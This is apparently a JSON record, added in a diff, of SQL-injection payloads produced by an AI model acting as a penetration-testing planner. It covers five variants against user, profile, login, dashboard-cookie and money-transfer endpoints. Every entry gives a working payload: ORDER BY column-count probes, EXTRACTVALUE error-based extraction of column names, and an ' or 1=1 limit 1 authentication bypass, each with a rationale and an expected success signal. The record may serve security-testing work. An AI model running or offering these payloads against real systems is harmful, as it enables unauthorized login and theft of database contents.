@@ -1,0 +1,68 @@
+{
+ "key": "sqli_2",
+ "model": "opencode/mimo-v2.6-flash-free",
+ "class": "sqli",
+ "variants": [
+  {
+   "endpoint": "GET /api/users",
+   "target_param": "id",
+   "recon_evidence": "MySQL fingerprint confirmed via version banner; 'id' reflects into a raw WHERE clause; ORDER BY 2 and ORDER BY 3 both returned rows cleanly, column count still unknown.",
+   "planner_rationale": "Establish the exact column count with an incremental ORDER BY probe before attempting any UNION SELECT.",
+   "vuln_class": "sqli",
+   "payload": "1 ORDER BY 4-- ",
+   "injection_point": "query",
+   "expected_success_signal": "Unknown column '4' in 'order clause' error confirming ORDER BY 3 was the last clean count",
+   "confidence": 0.9,
+   "reasoning": "ORDER BY column references are validated against the result set, so probing upward from a known-clean value yields an 'Unknown column' error at the first out-of-range index, pinning the column count for a matching UNION."
+  },
+  {
+   "endpoint": "GET /api/profile",
+   "target_param": "id",
+   "recon_evidence": "Numeric 'id' parameter; verbose MySQL errors echoed in the JSON response body; table 'users' already identified from an earlier dump; no UNION column slot available.",
+   "planner_rationale": "Since UNION is unavailable, pull column names out of the error channel using EXTRACTVALUE, one row per request.",
+   "vuln_class": "sqli",
+   "payload": "1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=users LIMIT 0,1)))",
+   "injection_point": "query",
+   "expected_success_signal": "Response containing an XPATH syntax error with ~<column_name>~ embedded in the message",
+   "confidence": 0.85,
+   "reasoning": "EXTRACTVALUE raises an XPATH error that embeds the concatenated string, so each request exfiltrates exactly one column name from information_schema.columns; incrementing LIMIT walks the rest."
+  },
+  {
+   "endpoint": "POST /api/session/login",
+   "target_param": "username",
+   "recon_evidence": "Form-body authentication; a previously tested unbounded ' OR 1=1 triggered a 500 because the backend choked on the oversized result set; credentials are otherwise checked server-side.",
+   "planner_rationale": "Keep the always-true authentication bypass but cap the result set so downstream code receives a single row.",
+   "vuln_class": "sqli",
+   "payload": "' or 1=1 limit 1 --",
+   "injection_point": "body",
+   "expected_success_signal": "HTTP 200 with a valid session token and no row-count or size error",
+   "confidence": 0.82,
+   "reasoning": "The injected OR 1=1 neutralizes the password predicate while LIMIT 1 prevents the multi-row processing error observed with the unbounded variant, returning exactly one account session."
+  },
+  {
+   "endpoint": "GET /dashboard",
+   "target_param": "sort_col (cookie)",
+   "recon_evidence": "Session cookie 'sort_col' is concatenated into an ORDER BY clause; MySQL error text is returned verbatim in the page; column count of the underlying view is undocumented.",
+   "planner_rationale": "Enumerate the ORDER BY column count through the cookie vector before constructing any UNION payload.",
+   "vuln_class": "sqli",
+   "payload": "1 ORDER BY 4-- ",
+   "injection_point": "cookie",
+   "expected_success_signal": "Unknown column '4' in 'order clause' error while ORDER BY 3 rendered the dashboard normally",
+   "confidence": 0.78,
+   "reasoning": "A cookie-sourced value interpolated into ORDER BY behaves identically to a query-string probe: out-of-range indexes raise 'Unknown column', revealing the last valid index as the column count."
+  },
+  {
+   "endpoint": "POST /api/transfer",
+   "target_param": "account_id",
+   "recon_evidence": "JSON body field 'account_id' is coerced into a numeric SQL context; MySQL error strings are surfaced to the client on validation failure; users table already enumerated.",
+   "planner_rationale": "Use error-based extraction on the numeric body parameter to recover users-table column names without needing a UNION slot.",
+   "vuln_class": "sqli",
+   "payload": "1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=users LIMIT 0,1)))",
+   "injection_point": "body",
+   "expected_success_signal": "Error response embedding XPATH syntax error: ~<column_name>~ in the reflected MySQL message",
+   "confidence": 0.72,
+   "reasoning": "EXTRACTVALUE forces the subquery result into a MySQL error string, which this endpoint reflects; because only one LIMIT-ed row can fit per error, each request recovers one column and the offset must be incremented to enumerate them all."
+  }
+ ],
+ "raw_tail": "mbedding XPATH syntax error: ~<column_name>~ in the reflected MySQL message\",\n    \"confidence\": 0.72,\n    \"reasoning\": \"EXTRACTVALUE forces the subquery result into a MySQL error string, which this endpoint reflects; because only one LIMIT-ed row can fit per error, each request recovers one column and the offset must be incremented to enumerate them all.\"\n  }\n]\n\u001b[0m\n> build · mimo-v2.6-flash-free\n"
+}
